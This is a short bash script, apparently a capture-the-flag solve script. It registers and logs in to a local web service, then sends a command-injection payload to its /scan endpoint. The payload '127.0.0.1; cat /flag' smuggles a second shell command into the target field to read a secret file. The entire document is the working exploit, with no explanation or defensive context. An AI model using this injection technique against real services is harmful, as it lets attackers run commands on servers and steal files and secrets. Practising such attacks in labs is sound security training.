#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${1:-http://127.0.0.1:12721}"

USER="user$RANDOM$RANDOM"
PASS="pass$RANDOM$RANDOM"

JAR="$(mktemp)"
cleanup() { rm -f "$JAR"; }
trap cleanup EXIT

curl -fsS -c "$JAR" -b "$JAR" \
  -X POST "$BASE_URL/register" \
  -d "username=$USER" \
  -d "password=$PASS" >/dev/null

curl -fsS -c "$JAR" -b "$JAR" \
  -X POST "$BASE_URL/login" \
  -d "username=$USER" \
  -d "password=$PASS" >/dev/null

curl -fsS -b "$JAR" \
  -X POST "$BASE_URL/scan" \
  --data-urlencode "target=127.0.0.1; cat /flag"

